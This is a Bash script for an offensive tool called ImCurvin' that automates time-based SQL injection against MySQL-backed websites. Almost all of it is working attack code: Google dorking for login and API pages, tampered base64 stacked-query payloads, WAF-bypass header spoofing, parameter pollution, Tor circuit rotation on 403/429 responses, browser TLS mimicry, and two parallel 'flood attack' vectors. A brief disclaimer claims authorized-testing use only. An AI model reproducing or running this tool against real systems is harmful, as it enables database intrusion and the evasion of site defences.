#!/bin/bash

# ImCurvin' v1.2.0
# Copyright 2026 Skokoo
# Licensed under the Apache License, Version 2.0

# WIP

target_url="$1"
export DEFIANCE_DIR="$(cd "$(dirname "${BASH_SOURCE}")" && pwd)"
export ROOT_LOG_FILE="$DEFIANCE_DIR/../targetDef.log"
ayamaa=$(date +%H:%M:%S)

source "$DEFIANCE_DIR/../tamper/hungry.sh"
# Killing all process related to this thing, since there's 2 vector. No no manual CTRL C.
heyoii_d_eb() {
  trap - SIGINT SIGTERM EXIT
  echo -e "\n\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Interrupted. Killing all process.."
  kill 0 2>/dev/null
  exit 130
}

trap 'heyoii_d_eb' SIGINT SIGTERM

if [ -n "$custom_proxy" ]; then
  export TOR_CIRCUITS=("$custom_proxy")
else
  export TOR_CIRCUITS=(9050 9052 9054 9056 9058 9060)
fi
# Random agent Array here.
export DEFIANCE_UA=(
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
)
# logo
print_defiance_logo(){
echo -e "    \e[38;5;45m____        \e[38;5;39m______           \e[38;5;27m_                 \e[0m"
echo -e "   \e[38;5;45m/  _/___ ___ \e[38;5;39m/ ____/_  _______\e[38;5;27m(_)___  ____ _    \e[0m"
echo -e "   \e[38;5;51m/ // __ \`__ \\\\\e[38;5;45m/ /   / / / / __\e[38;5;39m_/ / __ \\\\/ __ \` /    \e[0m"
echo -e " \e[38;5;51m_/ // / / / / \e[38;5;45m/ /___/ /_/ / /  \e[38;5;39m/ / / / / /_/ /     \e[0m"
echo -e "\e[38;5;51m/___/_/ /_/ /_/\e[38;5;51m\\\\____/\\__,_/_/  \e[38;5;45m/_/_/ /_/\\__, /      \e[0m"
echo -e "                                       \e[38;5;39m/____/       \e[0m"
  echo -e "\n\e[0;37m[\e[0;31m!\e[0;37m]\e[0m ImCurvin in the curve curing ;]"
if termux-am >/dev/null 2>&1; then
    echo -e "\e[38;5;196m[i] SYSTEM NOTICE (TERMUX):\e[0m If you zoom in excessively and experience layout tearing, please zoom out to restore interface alignment.\e[0m"
  fi
  if [ -n "$custom_proxy" ]; then
    echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Routing via $custom_proxy"
  fi
}
# HTTP pollution, air pollution.
# Told waf that this is JSON lol.
braindamage() {
  local choice=$((RANDOM % 3))
  local cf_ray=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 16 | head -n 1)
  if [[ "$target_url" == *"?"* ]]; then
    case "$choice" in
      0) echo "-H Content-Type:application/json -H X-Forwarded-For:127.0.0.1 -H CF-Connecting-IP:172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1)) -H CF-RAY:${cf_ray}-CGK" ;;
      1) echo "-H Content-Type:application/json -H CF-Visitor:{\"scheme\":\"https\"}" ;;
      2) echo "-H Content-Type:application/json -H X-WAF-Bypass:True -H CF-IPCountry:US -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;

    esac
  else
    case "$choice" in
      0) echo "-H Content-Type:application/json -H Authorization:Bearer $cf_ray -H X-WAF-Bypass:True -H CF-IPCountry:US" ;;
      1) echo "-H Content-Type:application/json -H X-Requested-With:XMLHttpRequest -H CF-RAY:${cf_ray}-CGK -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;
      2) echo "-H Content-Type:application/json -H Cache-Control:no-cache,no-store -H Pragma:no-cache -H X-Forwarded-For:127.0.0.1" ;;
    esac
  fi
}
# dork, goofle dorking. I mean google.
dork() {
  local ayamaa=$(date +%H:%M:%S)
  local dom="$1"
  echo -e "[\033[34m${ayamaa}\033[0m] [i] Launching Universal Google Dorking..."
  sleep 2

  local gerbang=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
    if [ -n "$custom_proxy" ]; then local prx="-x $gerbang"; else local prx="--socks5-hostname 127.0.0.1:$gerbang"; fi
    local samaran=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
      # fork, i mean dork. Search search lofin, i mena login. *mean.
      local q="site:${dom} (intitle:\"login\" inurl:\"login\") OR inurl:search OR inurl:api OR inurl:v1"
      local enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$q'''))")
      local raw=$(curl $prx -s -m 10 -A "$samaran" "https://google.com/search?q=${enc}&gbv=1")

      local -a list
      while read -r line; do
        if [[ -n "$line" ]]; then
          local decoded_line=$(python3 -c "import urllib.parse; print(urllib.parse.unquote('''$line'''))")
          list+=("$decoded_line")
        fi
      done < <(echo "$raw" | grep -oP '(?<=url\?q=)[^&]*' | grep "$dom" | sort -u | head -n 4)

      if [ ${#list[@]} -eq 0 ]; then
        echo -e "[\033[34m${ayamaa}\033[0m] [\033[34m-\033[0m]\e[0m No links found on Google Index."
        return 1
      fi

      echo -e "\n[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m] Top 4 Discovered Targets:"
      for i in "${!list[@]}"; do
        echo -e "[\e[1;34m$((i+1))\e[0m] ${list[$i]}"
      done

      echo -n -e "\n\e[0;32m[?]\e[0m Select target (1-4) or 's' to skip: "
      read -r -n 1 sel
      echo ""

      if [[ "$sel" =~ ^[1-4]$ ]]; then
        local idx=$((sel - 1))
        export target_url="${list[$idx]}"
        echo -e "\e[0;32m[+]\e[0m Locked on: \e[1;34m$target_url\e[0m"
        return 0
      else
        echo -e "[\033[34m${ayamaa}\033[0m] [i] Proceeding with default input."
        return 2
      fi
    }
    # 1st Vector func.
    vector_sqli_agressor_left() {
      while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
if [[ "$default_path" == "/" ]]; then
  default_path=""
fi
        local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
local current_time=$(date +%H:%M:%S)
          local proxy_flag=""
          if [ -n "$custom_proxy" ]; then
            proxy_flag="-x $random_port --fail"
          else
            proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
          fi

          local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
          local random_ua="$base_ua"
          local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)

          local target_cipher=""
          local target_tls13=""
          local rapid_reset_args="--http2 --parallel --parallel-max 50"
          local chunked_headers="-H \"Transfer-Encoding: chunked\" -H \"Content-Type: application/x-www-form-urlencoded\""
                    if [[ "$base_ua" == *"Firefox"* ]]; then
            
            random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
             target_cipher="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
            target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"

          elif [[ "$base_ua" == *"iPhone"* ]]; then

            random_ua="${base_ua} Mobile/15E148 Safari/604.1"
            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384"
            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
          else
            random_ua="${base_ua} Chrome/$((RANDOM % 10 + 125)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36"
            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
          fi
          local defiance_tamper_path=""
          local final_query=""
          local raw_payload="$query_payload"
          local t2=$(randomcase_engine "$raw_payload")
          local t4=$(space2comment_engine "$t2")
          local hex_xor=$(xor_engine "$t4")
          local b64_payload=$(base64_engine "$hex_xor")
          defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"

          if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
            final_query="${default_path}${defiance_tamper_path}"
          else
            if [[ "$defiance_tamper_path" == *"="* ]]; then
              local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
              local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
              final_query="${default_path}${param_name}=999&${param_name}=${param_val}${query_payload}"
            else
              final_query="${default_path}${defiance_tamper_path}"
            fi
          fi

          local waf_trick=$(braindamage)
        local clean_target_url="${target_url%%\?*}"
local active_payload=""
         if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
            active_payload="$t4"
          else
     active_payload="$defiance_tamper_path"
          fi
          if [ "$REQ_METHOD" = "POST" ]; then
          
          echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [POST][PORT:$random_port] Param: $TARGET_PARAM \033[38;5;238m[Payload: ${active_payload}]\033[0m\n"

          curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
            curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
            --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
            -m 12 -A "$random_ua" -s -o /dev/null -d @- \
            -w "%{time_total}|%{http_code}" \
            "${target_url}${default_path}")
        else

          echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [GET][Port:$random_port] Probing: \033[38;5;238m${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}\033[0m\n"
          
          curl_output=$(curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
            --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
            -m 12 -A "$random_ua" -s -o /dev/null \
            -w "%{time_total}|%{http_code}" \
            "${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}")
        fi        
          local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
          local http_status=$(echo "$curl_output" | cut -d'|' -f2)

          if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
            echo -e "[\033[34m${current_time}\033[0m] [\033[1;34m!\033[0m] Port $random_port Shadowbanned [HTTP $http_status]. Rotating TOR IP Circuit..."
            (echo "AUTHENTICATE \"\""; echo "SIGNAL NEWNYM"; echo "QUIT") | nc 127.0.0.1 9051 >/dev/null 2>&1
            sleep 1
          fi

          if [[ -n "$stopwatch" && "$stopwatch" != "0.000000" ]]; then
            if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
              echo -e "[\033[34m${current_time}\033[0m] [\033[2;34m×\033[0m] Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"
              echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
            fi
          fi

          sleep $((RANDOM % 6 + 4))
        done < <(shuf "$WORDLIST_MYSQL")
      }
      vector_sqli_agressor_right() {
        while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
          if [[ "$default_path" == "/" ]]; then
  default_path=""
fi

          local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
local current_time=$(date +%H:%M:%S)
            local proxy_flag=""
            if [ -n "$custom_proxy" ]; then
              proxy_flag="-x $random_port --fail"
            else
              proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
            fi

            local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
            local random_ua="$base_ua"
            local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
            local target_cipher=""
            local target_tls13=""
            local rapid_reset_args="--http2 --parallel --parallel-max 50"
            local chunked_headers="-H \"Transfer-Encoding: chunked\" -H \"Content-Type: application/x-www-form-urlencoded\""
                      if [[ "$base_ua" == *"Firefox"* ]]; then
            
            random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
             target_cipher="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
            target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"

          elif [[ "$base_ua" == *"iPhone"* ]]; then
            
            random_ua="${base_ua} Mobile/15E148 Safari/604.1"
            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384"
            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"

          else
            
            random_ua="${base_ua} Chrome/$((RANDOM % 10 + 125)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36"
             target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
          fi
            local defiance_tamper_path=""
            local final_query=""
            local raw_payload="$query_payload"
            local t2=$(randomcase_engine "$raw_payload")
            local t4=$(space2comment_engine "$t2")
            local hex_xor=$(xor_engine "$t4")
            local b64_payload=$(base64_engine "$hex_xor")
            defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"

            if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
              final_query="${default_path}${defiance_tamper_path}"
            else
              if [[ "$defiance_tamper_path" == *"="* ]]; then
                local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
                local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
                final_query="${default_path}${param_name}=999&${param_name}=${param_val}${query_payload}"
              else
                final_query="${default_path}${defiance_tamper_path}"
              fi
            fi
            local waf_trick=$(braindamage)
        local clean_target_url="${target_url%%\?*}"
         if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
            active_payload="$t4"
          else
     active_payload="$defiance_tamper_path"
          fi
          if [ "$REQ_METHOD" = "POST" ]; then
            
            echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m>\e[0m] Vector 2 [POST][PORT:$random_port] Param: $TARGET_PARAM  \033[38;5;238m[Payload: ${active_payload}]\033[0m\n"

            curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
              curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
              --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
              -m 12 -A "$random_ua" -s -o /dev/null -d @- \
              -w "%{time_total}|%{http_code}" \
              "${target_url}${default_path}")
          else

            echo -e "[\033[34m${current_time}\033[0m] [\e[0;34m>\e[0m] Vector 2 [GET][Port:$random_port] Probing: \033[38;5;238m${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}\033[0m\n"

            curl_output=$(curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
            --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
            -m 12 -A "$random_ua" -s -o /dev/null \
            -w "%{time_total}|%{http_code}" \
            "${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}")
          fi
            local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
            local http_status=$(echo "$curl_output" | cut -d'|' -f2)

            if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
              echo -e "[\033[34m${current_time}\033[0m] [\033[1;34m!\033[0m] Port $random_port Shadowbanned [HTTP $http_status]. Rotating TOR IP Circuit..."
              (echo "AUTHENTICATE \"\""; echo "SIGNAL NEWNYM"; echo "QUIT") | nc 127.0.0.1 9051 >/dev/null 2>&1
              sleep 1
            fi

            if [[ -n "$stopwatch" && "$stopwatch" != "0.000000" ]]; then
              if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
                echo -e "[\033[34m${current_time}\033[0m] [\033[2;34m×\033[0m]\e[0m Vector 2 confirmed MySQL Anomaly: ${stopwatch}s"
                echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
              fi
            fi

            sleep $((RANDOM % 6 + 4))
          done < <(shuf "$WORDLIST_MYSQL")
        }
reconi() {
  local current_time=$(date +%H:%M:%S)
  echo -e "[\033[34m${current_time}\033[0m] [i] Initiating Rapid Environmental Reconnaissance on $target_url..."
  echo -e "[\033[34m${current_time}\033[0m] [i] Network locked to static proxy configuration [Port: 9050] for instant evaluation.\n"
  local static_proxy="--socks5-hostname 127.0.0.1:9050"
  if [ -n "$custom_proxy" ]; then
    static_proxy="-x $custom_proxy"
  fi

  local clean_domain=$(echo "$target_url" | awk -F/ '{print $3}' | cut -d':' -f1)
  local raw_headers=$(curl $static_proxy -m 5 -s -I "$target_url" | tr -d '\r')

  local http_status=$(echo "$raw_headers" | grep -Ei "^HTTP/" | head -n 1 | awk '{print $2, $3}')
  local srv_info=$(echo "$raw_headers" | grep -Ei "^Server:" | awk -F': ' '{print $2}')
  local pwd_info=$(echo "$raw_headers" | grep -Ei "^X-Powered-By:" | awk -F': ' '{print $2}')
  local waf_info=$(echo "$raw_headers" | grep -Ei "(WAF|X-DDoS|Cloudflare|Sucuri|Incapsula|Akamai|FortiWeb)" | head -n 1)
  local hsts_info=$(echo "$raw_headers" | grep -Ei "^Strict-Transport-Security:")

  local tor_ip=$(curl $static_proxy -m 5 -s https://torproject.org | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -n 1)
  local target_ip=$(curl $static_proxy -m 5 -s -w "%{remote_ip}" -o /dev/null "$target_url")

  local whois_data=$(whois "$clean_domain" 2>/dev/null)
  local registrar=$(echo "$whois_data" | grep -Ei "^Registrar:" | head -n 1 | awk -F': ' '{print $2}' | xargs)
  local created=$(echo "$whois_data" | grep -Ei "(Creation Date|Registered On):" | head -n 1 | awk -F': ' '{print $2}' | xargs)
  local expires=$(echo "$whois_data" | grep -Ei "(Registry Expiry Date|Expiry Date|Expiration Date):" | head -n 1 | awk -F': ' '{print $2}' | xargs)

  current_time=$(date +%H:%M:%S)
  echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[=]\e[0m Reconnaissance Intelligence Report Consolidated:"

  if [ -n "$tor_ip" ]; then
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m Outbound Gateway Proxy  : \033[34m${tor_ip}\033[0m"
  else
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m Outbound Gateway Proxy  : \033[90m[Direct Connection / Proxy Offline]\033[0m"
  fi

  if [ -n "$target_ip" ]; then
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m Target Host Resolved IP : \033[34m${target_ip}\033[0m"
  else
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m Target Host Resolved IP : \033[90m[Failed to resolve IP]\033[0m"
  fi

  if [ -n "$http_status" ]; then
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m HTTP Response Status    : \033[34m${http_status}\033[0m"
  else
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m HTTP Response Status    : \033[90m[No Response]\033[0m"
  fi

  if [ -n "$srv_info" ]; then
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m Remote Web Server       : \033[34m${srv_info}\033[0m"
  else
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m Remote Web Server       : \033[90m[Hidden/Not Detected]\033[0m"
  fi

  if [ -n "$pwd_info" ]; then
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m Backend Infrastructure  : \033[34m${pwd_info}\033[0m"
  else
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m Backend Infrastructure  : \033[90m[Hidden/Not Detected]\033[0m"
  fi

  if [[ "$target_url" == "https://"* ]]; then
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m Transport Layer Security : \033[34mHTTPS [Encrypted Channel]\033[0m"
  else
    echo -e "[\033[34m${current_time}\033[0m] \e[0;33m[!]\e[0m Transport Layer Security : \033[90mHTTP [Insecure / Plaintext Channel]\033[0m"
  fi

  if [ -n "$waf_info" ]; then
    echo -e "[\033[34m${current_time}\033[0m] \e[0;31m[!]\e[0m Active Security Firewall: \033[34m${waf_info}\033[0m"
  else
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m Active Security Firewall: \033[90m[No active enterprise WAF signature detected]\033[0m"
  fi

  if [ -n "$hsts_info" ]; then
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m HSTS Enforcement        : \033[34mEnabled\033[0m"
  else
    echo -e "[\033[34m${current_time}\033[0m] \e[0;33m[!]\e[0m HSTS Enforcement        : \033[90mDisabled / Missing\033[0m"
  fi

  if [ -n "$registrar" ]; then
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m Domain Registrar        : \033[34m${registrar}\033[0m"
  else
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m Domain Registrar        : \033[90m[Not Detected / Private]\033[0m"
  fi

  if [ -n "$created" ]; then
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m Registration Date       : \033[34m${created}\033[0m"
  else
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m Registration Date       : \033[90m[Not Detected / Private]\033[0m"
  fi

  if [ -n "$expires" ]; then
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m Expiration Date         : \033[34m${expires}\033[0m"
  else
    echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m Expiration Date         : \033[90m[Not Detected / Private]\033[0m"
  fi
  
  echo ""
  sleep 1
  exit 0
}
        clear
        print_defiance_logo
        if [[ "$recon" = "true" ]]; then
        reconi
fi
        echo -e "[\033[1;34mWARNING\033[0m]* ImCurvin is designed for authorized security testing and educational purposes only."

echo "Running this tool against targets without priorwritten consent is strictly illegal. The developer assumes no liability andis not responsible for any misuse, damage, or system instability caused bythis software. By executing this script, you agree to these terms."
     
        if ! command -v xxd &> /dev/null; then
          echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: 'xxd' is not installed on your terminal."
          echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install xxd first before running imCurvin'."
          exit 1
        fi
        if [ -z "$custom_proxy" ]; then
          echo -e "\n[\033[34m${ayamaa}\033[0m] [i]\e[0m Checking for TOR terminal service..."

          if pgrep -x "tor" >/dev/null 2>&1; then

            echo -e "[\033[34m${ayamaa}\033[0m] [i] Tor terminal service detected as active."
          else
            echo -e "[\033[34m${ayamaa}\033[0m] [->] WARNING: Tor terminal service is not detected/running."
            echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Run 'tor' command in a new terminal before using Defiance Mode."

            echo -e "[\033[34m${ayamaa}\033[0m] [->] Operation aborted due to environment mismatch."
            exit 1
          fi
        fi

        echo -e "[\033[34m${ayamaa}\033[0m] [i] Tracing target redirections."

        recon_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}

          if [ -n "$custom_proxy" ]; then
            recon_proxy="-x $recon_port";
          else

            recon_proxy="--socks5-hostname 127.0.0.1:$recon_port";
          fi

          final_destination_url=$(curl $recon_proxy --connect-timeout 5 --retry 2 -m 8 -s -o /dev/null -w "%{url_effective}" -L "$target_url")   

          export target_url="$final_destination_url"

          clean_domain=$(echo "$target_url" | sed -e 's|^[^/]*//||' -e 's|/.*||' -e 's|:.*||')
          dork "$clean_domain"
          dork_status=$?

                    if [ -f "$DEFIANCE_DIR/../validators/ayam.py" ]; then
            echo -e "[\033[34m${ayamaa}\033[0m] [i] Analyzing parameter.."
            eye_report=$(python "$DEFIANCE_DIR/../validators/ayam.py" "$target_url")

            param_type=$(echo "$eye_report" | cut -d'|' -f1)
            discovered_keys=$(echo "$eye_report" | cut -d'|' -f3)

            if [ "$param_type" = "QUERY_PARAM" ]; then
              echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m] Active Query Parameters Spotted > ($discovered_keys)"
              export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
              export REQ_METHOD="GET"
              export TARGET_PARAM=$(echo "$discovered_keys" | cut -d',' -f1)

           elif [ "$param_type" = "PATH_PARAM" ] || [ "$param_type" = "NO_PARAM" ] || [[ "$target_url" != *"?"* ]]; then
              echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Error: GET parameters not found [POST Method / Form Detected]."
              echo -e "[\033[34m${ayamaa}\033[0m] [i] Action Required: Please inspect the target's HTML form elements to identify valid parameters first."
              echo -e "\e[0;37m[-] Operation aborted to prevent invalid asset execution.\n"
              exit 1

            else
              echo -e "[\033[34m${ayamaa}\033[0m] [i] No parameters detected. Falling back to default."
              export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
              export REQ_METHOD="GET"
            fi
          fi
          cookie_flag=""
          if [ -n "$custom_cookie" ]; then
            cookie_flag="-b $custom_cookie"
            echo "[\033[34m${ayamaa}\033[0m] [i] Custom Cookie inputted: $custom_cookie" 
          fi
          echo -e "\n[\033[34m${ayamaa}\033[0m] [i] Performing database environment verification.."

          server_fingerprint=$(curl $recon_proxy -m 5 -s -I "$target_url" | grep -Ei "(Server|X-Powered-By|Set-Cookie|X-DDoS|WAF)")

          if echo "$server_fingerprint" | grep -qEi "(oracle|postgre|mssql|microsoft-iis|supabase)"; then
            echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Target rejected, Non MySQL environment fingerprint."

            echo -e "[i] Footprint: $(echo "$server_fingerprint" | tr '\r\n' ' ')"

            echo -e "[\033[34m${ayamaa}\033[0m][->] Revert. Operation aborted to prevent structural asset wastage."
            exit 1

          else

            echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m]\e[0m Target environment matches MySQL compliance directives."
          fi
   if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then

echo -e "[\033[34m${ayamaa}\033[0m] [i] This web envi is outdated/just a test, to ensure the payloads to be executed, the tamper has been downgraded [Space2comment, randomcase only].\n"

fi
          sleep 1
          if [ "$enable_val" = "true" ]; then
         if [ -s "$ROOT_LOG_FILE" ]; then
              echo -e "[\033[34m${ayamaa}\033[0m] [?] Your log file is not empty."
              read -p "[\033[34m${ayamaa}\033[0m] Do you want to overwrite it? (y/n): " tanya
              if [ "$tanya" = "y" ]; then
                > "$ROOT_LOG_FILE"
                echo -e "[\033[34m${ayamaa}\033[0m] [\033[34m+\e[0m] Log overwritten.\n"
              else
                echo -e "[\033[34m${ayamaa}\033[0m] [i] Previous log entries will also be scanned."
              fi
            fi
fi
          echo -e "\n[\033[34m${ayamaa}\033[0m] [i] Launching dualvector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"

          vector_sqli_agressor_left &
          pid_vector1=$!

          vector_sqli_agressor_right &
          pid_vector2=$!

          wait $pid_vector1 $pid_vector2

          echo -e "\n[\033[34m${ayamaa}\033[0m] [COMPLETE]\e[0m Attack sequence completed. Input to Defiance Log Analyst.."
          sleep 1
          if [ "$enable_val" = "true" ]; then
            if [ -f "$DEFIANCE_DIR/../validators/defval.py" ]; then
              python "$DEFIANCE_DIR/../validators/defval.py"
            else
              echo -e "[\033[34m${ayamaa}\033[0m] [->] defval.py not found. Skipping validate."
            fi
          else
            echo -e "[\033[34m${ayamaa}\033[0m] [i] Skipping validating, use the option -val to enable it."
          fi

          echo ""
